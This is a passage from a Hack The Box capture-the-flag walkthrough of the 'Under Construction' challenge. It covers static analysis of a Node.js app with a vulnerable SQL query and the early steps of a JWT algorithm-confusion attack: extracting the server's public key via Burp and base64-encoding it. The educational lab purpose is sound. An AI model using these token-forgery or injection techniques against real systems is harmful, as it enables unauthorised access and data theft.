</span></span><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s2>&#34;9f5c670ddfe72f08828eee3732ee8b00340fe7cf6448294039a4a384aff7e08c  Under Construction.zip&#34;</span> <span class=p>|</span> sha256sum -c
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 8.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 5.9K Jun  <span class=m>8</span> 12:22 <span class=s1>&#39;Under Construction.zip&#39;</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>echo</span> -n <span class=s2>&#34;9f5c670ddfe72f08828eee3732ee8b00340fe7cf6448294039a4a384aff7e08c  Under Construction.zip&#34;</span> <span class=p>|</span> sha256sum -c
</span></span><span class=line><span class=cl>Under Construction.zip: OK
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Everything seems fine, so we <strong>unpack</strong> the archive,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>mkdir challenge-files
</span></span><span class=line><span class=cl>unzip -P hackthebox Under<span class=se>\ </span>Construction.zip -d challenge-files/
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mkdir challenge-files
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ unzip -P hackthebox Under<span class=se>\ </span>Construction.zip -d challenge-files/
</span></span><span class=line><span class=cl>Archive:  Under Construction.zip
</span></span><span class=line><span class=cl>  inflating: challenge-files/index.js  
</span></span><span class=line><span class=cl>  inflating: challenge-files/package.json  
</span></span><span class=line><span class=cl>   creating: challenge-files/middleware/
</span></span><span class=line><span class=cl>  inflating: challenge-files/middleware/AuthMiddleware.js  
</span></span><span class=line><span class=cl>   creating: challenge-files/helpers/
</span></span><span class=line><span class=cl>  inflating: challenge-files/helpers/DBHelper.js  
</span></span><span class=line><span class=cl>  inflating: challenge-files/helpers/JWTHelper.js  
</span></span><span class=line><span class=cl>   creating: challenge-files/routes/
</span></span><span class=line><span class=cl>  inflating: challenge-files/routes/index.js  
</span></span><span class=line><span class=cl>   creating: challenge-files/views/
</span></span><span class=line><span class=cl>  inflating: challenge-files/views/auth.html  
</span></span><span class=line><span class=cl>  inflating: challenge-files/views/index.html  
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>and use <em><strong>tree</strong></em> to get a better view of the <strong>extracted</strong> files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>tree challenge-files/
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ tree challenge-files/
</span></span><span class=line><span class=cl>challenge-files/
</span></span><span class=line><span class=cl>├── helpers
</span></span><span class=line><span class=cl>│   ├── DBHelper.js
</span></span><span class=line><span class=cl>│   └── JWTHelper.js
</span></span><span class=line><span class=cl>├── index.js
</span></span><span class=line><span class=cl>├── middleware
</span></span><span class=line><span class=cl>│   └── AuthMiddleware.js
</span></span><span class=line><span class=cl>├── package.json
</span></span><span class=line><span class=cl>├── routes
</span></span><span class=line><span class=cl>│   └── index.js
</span></span><span class=line><span class=cl>└── views
</span></span><span class=line><span class=cl>    ├── auth.html
</span></span><span class=line><span class=cl>    └── index.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>4</span> directories, <span class=m>8</span> files
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>All the files are <strong>backend source files</strong>:</p><ul><li><strong>five</strong> <em><strong>javascript</strong></em></li><li><strong>one</strong> <em><strong>JSON</strong></em></li><li><strong>two</strong> <em><strong>html</strong></em></li></ul><h2 id=static-code-analysis><strong>STATIC CODE ANALYSIS</strong><a hidden class=anchor aria-hidden=true href=#static-code-analysis>#</a></h2><p>Since it looks like, that the next part of the challenge is going to revolve <strong>analyzing source code</strong> (<em><strong>static analysis</strong></em>), let&rsquo;s <strong>open</strong> these files <strong>in</strong> a <strong>code editor</strong>. The one that comes preinstalled on the <strong>pwnbox</strong> is <em><strong>vscodium</strong></em>, the clone of <em>Microsoft</em>&rsquo;s popular <em>Visual Studio Code</em> editor - without of course the embedded <strong>user data</strong> <strong>tracking</strong> features.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>codium .
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>cd</span> challenge-files/
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction/challenge-files<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ codium .
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.63<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-d5vawtsv6o<span class=o>]</span>─<span class=o>[</span>~/under-construction/challenge-files<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/vscodium.png alt=vscodium title=vscodium></p><p>Much better &ndash; now let&rsquo;s start with the <em><strong>index.js</strong></em> file. Here is a very brief <strong>source analysis</strong> on it:</p><h3 id=-indexjs-><em><strong># index.js #</strong></em><a hidden class=anchor aria-hidden=true href=#-indexjs->#</a></h3><p><strong>- REQUIREMENTS -</strong></p><ul><li>it uses the <strong>express</strong> web framework &ndash; sadly no vulnerabilities were reported for - &ldquo;express&rdquo;: &ldquo;^4.17.1&rdquo; - (from <em><strong>package.json</strong></em>)</li><li>it uses two <strong>parsers</strong>:<ul><li><em><strong>body-parser</strong></em> &ndash; to parse incoming request bodies &ndash; no vulnerabilities for - &ldquo;body-parser&rdquo;: &ldquo;^1.19.0&rdquo; -</li><li><em><strong>cookie-parser</strong></em> &ndash; to parse cookie headers &ndash; no vuln. for &ldquo;cookie-parser&rdquo;: &ldquo;^1.4.4&rdquo; -</li></ul></li><li>link to <em><strong>routes/index.js</strong></em></li><li>it uses <em><strong>nunjucks</strong></em> &ndash; templating engine for js &ndash; &ldquo;nunjucks&rdquo;: &ldquo;^3.2.0&rdquo; &ndash;> 2 vulnerabilities<ul><li>CVE-2023-2142 (XXS - Medium severity)</li><li>CWE-1321 (<a href=https://portswigger.net/web-security/prototype-pollution title="Prototype Pollution">Prototype Pollution</a>- High serverity)</li></ul></li></ul><p><strong>- CODE -</strong></p><ul><li>it&rsquo;s the basic structure of an <em><strong>express</strong></em> application</li><li><strong>registers</strong> middleware functions to handle URL-encoded data, cookies and <em><strong>nunjucks</strong></em> templates</li><li><strong>defines</strong> a catch-all route to handle any requests that do not match any other routes</li><li><strong>starts</strong> the application listening on port 1337</li></ul><p>Let&rsquo;s check out those aforementioned <em><strong>routes</strong></em> (- <em>routes/index.js</em> -).</p><h3 id=-routesindexjs-><em><strong># routes/index.js #</strong></em><a hidden class=anchor aria-hidden=true href=#-routesindexjs->#</a></h3><p><strong>- REQUIREMENTS -</strong></p><ul><li>import <em><strong>path</strong></em> module from the standard <em><strong>Node.js</strong></em> library</li><li>links to<ul><li>- <em>../middleware/AuthMiddleware</em> -</li><li>- <em>../helpers/JWTHelper</em> -</li><li>- <em>../helpers/DBHelper</em> -</li></ul></li></ul><p><strong>- CODE -</strong></p><ul><li><strong>defines</strong> a number of <strong>routes</strong> for a simple authentication system<ul><li><strong>home route</strong> - (<em>/</em>) - &ndash; get the user<ul><li>user exists &ndash;> render <em><strong>index.html</strong></em> with user data</li><li>user does not exists &ndash;> 404 error is returned</li></ul></li></ul></li><li><em><strong>get(&rsquo;/auth&rsquo;, &mldr;)</strong></em> &ndash; render <em>auth.html</em> template &ndash; contains a form that users can use to login or register</li><li><em><strong>get(&rsquo;/logout&rsquo;, &mldr;)</strong></em> &ndash; clear user&rsquo;s session cookie and redirect to - <em>/auth</em> - route</li><li><em><strong>post(&rsquo;/auth&rsquo;, &mldr;)</strong></em> &ndash; handle user login and registration requests<ul><li>empty username or password &ndash;> redirect to - <em>/auth</em> -</li><li>username already exists in the database &ndash;> redirect to - <em>/auth</em> - with error message</li><li>username does not exists in db &ndash;> create new user in db and redirect to - <em>/auth</em> - with success message</li></ul></li><li><strong>registered user</strong><ul><li><strong>NO</strong> username:password match in db &ndash;> redirect to - <em>/auth</em> - with error message</li><li>username:passowrd match in db &ndash;> <strong>create a JWT token</strong> for the user, redirects to <strong>home page</strong> - <em>&rsquo;/&rsquo;</em> - and <strong>set</strong> the <strong>session cookie</strong> with the newly created token</li></ul></li></ul><h3 id=-indexhtml-><em><strong># index.html #</strong></em><a hidden class=anchor aria-hidden=true href=#-indexhtml->#</a></h3><p>There is nothing really interesting in the <em><strong>index.html</strong></em> besides</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome {{ user.username }}<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>which should <strong>reflect</strong> our <strong>username</strong> back to us.</p><h3 id=-authhtml-><em><strong># auth.html #</strong></em><a hidden class=anchor aria-hidden=true href=#-authhtml->#</a></h3><p>The <em><strong>auth.html</strong></em> describes and defines the <strong>login form</strong> and the corresponding actions.</p><h3 id=-middlewareauthmiddlewarejs-><em><strong># middleware/AuthMiddleware.js #</strong></em><a hidden class=anchor aria-hidden=true href=#-middlewareauthmiddlewarejs->#</a></h3><p>Continuing with the <em><strong>middleware/AuthMiddleware.js</strong></em> file, all it does in a nutshell is to <em><strong>authenticate users using JWT tokens</strong></em>.</p><ul><li>session cookie <strong>NOT</strong> set &ndash;> redirect to - <em>/auth</em> -</li><li>session cookie is <strong>set</strong> &ndash;> decode JWT token &ndash; extract username from token &ndash; set username property</li></ul><h3 id=-helpersdbhelperjs-><em><strong># helpers/DBHelper.js #</strong></em><a hidden class=anchor aria-hidden=true href=#-helpersdbhelperjs->#</a></h3><ul><li>simply functions that interact witht he SQLite db (database)<ul><li>getUser &ndash;> get user from db</li><li>checkUser &ndash;> check username in the db</li><li>createUser &ndash;> create user entry in the db</li><li>attempLogin &ndash;> attempt log user in by username:password</li></ul></li></ul><p>There is one very <strong>important</strong> thing to <strong>note</strong> here,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nx>db</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=sb>`SELECT * FROM users WHERE username = &#39;</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>&#39;`</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>data</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=k>return</span> <span class=nx>rej</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>res</span><span class=p>(</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>which looks susceptible to common <strong>SQL injection</strong> attacks. Given that the other functions use <strong>query/name placeholders</strong>, only the <em><strong>getUser()</strong></em> appears <strong>vulnerable</strong>.</p><h3 id=-helpersjwtjs-><em><strong># helpers/JWT.js #</strong></em><a hidden class=anchor aria-hidden=true href=#-helpersjwtjs->#</a></h3><p><strong>- REQUIREMENTS -</strong></p><ul><li>import <em><strong>fs</strong></em> (for file system usage) module from the standard <em><strong>Node.js</strong></em> library</li><li>uses <em><strong>jsonwebtoken</strong></em> &ndash; <strong>THREE</strong> vulnerabilities with <strong>medium severity issues</strong> for version - 8.5.1 -<ul><li>CVE-2022-23539 &ndash;> Use of a Broken or Risky Cryptographic Algorithm</li><li>CVE-2022-23540 &ndash;> Improper Authentication</li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-23541" title=CVE-2022-23541>CVE-2022-23541</a> &ndash;> Improper Restriction of Security Token Assignment</li></ul></li></ul><p>The following <strong>snippet</strong> we find proves very <strong>important</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens.
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>HMAC Algorithm Attack: an attacker creates the token by setting the signing algorithm to a symmetric HS256 instead of an asymmetric RS256, leading the API to blindly verify the token using the HS256 algorithm using the public key as a secret key. Since the public key is known, the attacker can correctly forge valid JWTs.
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>and reading about <a href=https://portswigger.net/web-security/jwt/algorithm-confusion title="algorithm confusion attacks">algorithm confusion attacks</a>
all but <strong>verifies</strong> it.</p><p>This <strong>vulnerability</strong> would in a nutshell enable us to <strong>forge</strong> arbitrary <em><strong>JWT</strong></em> tokens.</p><p><strong>- CODE -</strong></p><ul><li>functions to <strong>sign</strong> and <strong>verify</strong> JSON Web Tokens (JWTs)</li><li>read files:<ul><li>- <em>./private.key</em> -</li><li>- <em>../public.key</em> -</li></ul></li><li><em><strong>sign()</strong></em> &ndash;> <em><strong>sign</strong></em> with <strong>private key</strong> &ndash; use <em><strong>RS256</strong></em> algorithm</li><li><em><strong>decode()</strong></em> &ndash;> <em><strong>decode</strong></em> JWT token with <strong>public key</strong> &ndash; use <em><strong>RS256</strong></em> and <em><strong>HS256</strong></em> algorithm</li></ul><p>Notice how there we are allowed to use <strong>BOTH</strong> <strong>symmetric</strong> (HS256) as well as <strong>asymmetric</strong> (RS256) cryptographic functions for <strong>decoding/decrypting</strong> the <em><strong>JWT</strong></em> token.</p><h2 id=algorithm-confusion-attack><strong>ALGORITHM CONFUSION ATTACK</strong><a hidden class=anchor aria-hidden=true href=#algorithm-confusion-attack>#</a></h2><p>With the <strong>vulnerability</strong> <strong>identified</strong>, let&rsquo;s try and <strong>exploit</strong> it by following the steps described in the <strong>PortSwigger</strong> post. The <strong>steps</strong> for performing an <strong>algorithm confusion attack</strong> are as follows:</p><ol><li><strong>Obtain the server&rsquo;s public key</strong></li><li><strong>Convert the public key to a suitable format</strong></li><li><strong>Create a malicious JWT with a modified payload and the alg header set to HS256.</strong></li><li><strong>Sign the token with HS256, using the public key as the secret.</strong></li></ol><p>Firing up a browser and taking a <strong>closer look</strong> at our target&rsquo;s <strong>webpage</strong> lands us with a <strong>login page</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/login-form.png alt=login-form title=login-form></p><h3 id=step-1----obtain-the-servers-public-key><strong>Step 1</strong> &ndash; <strong>Obtain the server&rsquo;s public key</strong>.<a hidden class=anchor aria-hidden=true href=#step-1----obtain-the-servers-public-key>#</a></h3><p>Following the <strong>instructions</strong> and setting our sight on first <strong>obtaining</strong> the <strong>public key</strong>, we try to extract it from a pair of existing JWTs. So let&rsquo;s fire up <em><strong>burp</strong></em> and <strong>intercept</strong> the <em><strong>JWT</strong></em>s.</p><p>Since we already analysed the <strong>backend code</strong>, we already know, that only in the case of an <strong>already logged in user</strong> do the server <strong>sign</strong> the <strong>token</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// routes/index.js
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>token</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>JWTHelper</span><span class=p>.</span><span class=nx>sign</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>username</span><span class=o>:</span> <span class=nx>username</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&#39;/g</span><span class=p>,</span> <span class=s2>&#34;\&#39;\&#39;&#34;</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&#34;/g</span><span class=p>,</span> <span class=s2>&#34;\&#34;\&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>So first we will have to <strong>create</strong> one. <strong>Registering</strong> some <strong>test credentials</strong> like - <em>username:password</em> - and <strong>logging</strong> in does provide us with the desired, signed <strong>token</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_signed-token.png alt=burp_signed-token title=burp_signed-token></p><p>Before moving on to the next step, we first send the <strong>request</strong> to <em><strong>burp</strong></em>&rsquo;s <em><strong>Repeater</strong></em> and then we install the <em><strong>JWT Editor</strong></em> extension in Burp (Extender &ndash;> BApp Store &ndash;> Search for JWT Editor &ndash;> Install both of the extensions: <em><strong>JWT Editor Keys</strong></em> and <em><strong>JSON Web Tokens</strong></em>).</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_jwt-editors.png alt=burp_jwt-editors title=burp_jwt-editors></p><p>Copying our signed token to the <em><strong>JSON Web Tokens</strong></em> extension reveals, that <em><strong>RSA public key</strong></em> is indeed sent along in the <em><strong>Payload</strong></em> part. This is how our <strong>decoded</strong> <em><strong>JWT</strong></em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=err>Headers</span> <span class=err>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;alg&#34;</span><span class=p>:</span> <span class=s2>&#34;RS256&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;typ&#34;</span><span class=p>:</span> <span class=s2>&#34;JWT&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>Payload</span> <span class=err>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;username&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;pk&#34;</span><span class=p>:</span> <span class=s2>&#34;-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;iat&#34;</span><span class=p>:</span> <span class=mi>1686225169</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>Signature</span> <span class=err>=</span> <span class=s2>&#34;g32U0iT0x4F8WbPcUGQ4SaA9OlgNt15kZotnypKu8V2HkeFNB7bG2yoXhkqGCj9CLI9L71SH2z20AJHSQPc6CMf2kwd-4QSjy1Oq6dr70cOcuMYbzeFpiJwVqtn1TJwcFyCv6lC1FQiOtFYg9k-yAkoD99K6wknBKxoo49N38aXs83a6pm9eJ1e1PbhtHtT5w2f5mi8cIeL5jVwu5TmzZfSyIgrjM82_czgmfE67ajay9oUBU9EHpTVXcNmItuDGFOHREGvRNWcysnGEjkm7-P4RwGDzOIciMrPEfpUZJWRjw78lVEwH_s0iINtFBG3KtsRGglO9itTDN8VGLe6apQ&#34;</span>
</span></span></code></pre></div><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_decoded-jwt.png alt=burp_decoded-jwt title=burp_decoded-jwt></p><p>and the <strong>public RSA key</strong> looks like.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n
</span></span></code></pre></div><p>But it&rsquo;s still full of those new line characters (&rsquo;\n&rsquo;) so we <strong>remove them</strong> and we make sure to have an <strong>appending</strong> <strong>new line</strong> at the end.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>-----BEGIN PUBLIC KEY-----
</span></span><span class=line><span class=cl>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
</span></span><span class=line><span class=cl>ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
</span></span><span class=line><span class=cl>XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
</span></span><span class=line><span class=cl>jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
</span></span><span class=line><span class=cl>+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
</span></span><span class=line><span class=cl>V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
</span></span><span class=line><span class=cl>0wIDAQAB
</span></span><span class=line><span class=cl>-----END PUBLIC KEY-----
</span></span></code></pre></div><p>With this, we are through with the first step.</p><h3 id=step-2----converting-the-public-key-to-a-suitable-format><strong>Step 2</strong> &ndash; <strong>Converting the public key to a suitable format</strong>.<a hidden class=anchor aria-hidden=true href=#step-2----converting-the-public-key-to-a-suitable-format>#</a></h3><p>Given that our public RSA key is already in a <em><strong>PEM</strong></em> format, we continue with the fourth <strong>substep</strong>:</p><ul><li><strong>Substep 4</strong> &ndash; <em>Go to the Decoder tab and Base64-encode the PEM.</em></li></ul><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_encoded-rsa.png alt=burp_encoded-rsa title=burp_encoded-rsa></p><p>This is how the <strong>base64</strong> encoded <strong>public RSA key</strong> looks like.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWQprdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpClh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemcKaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSAorRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14ClY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHIKMHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
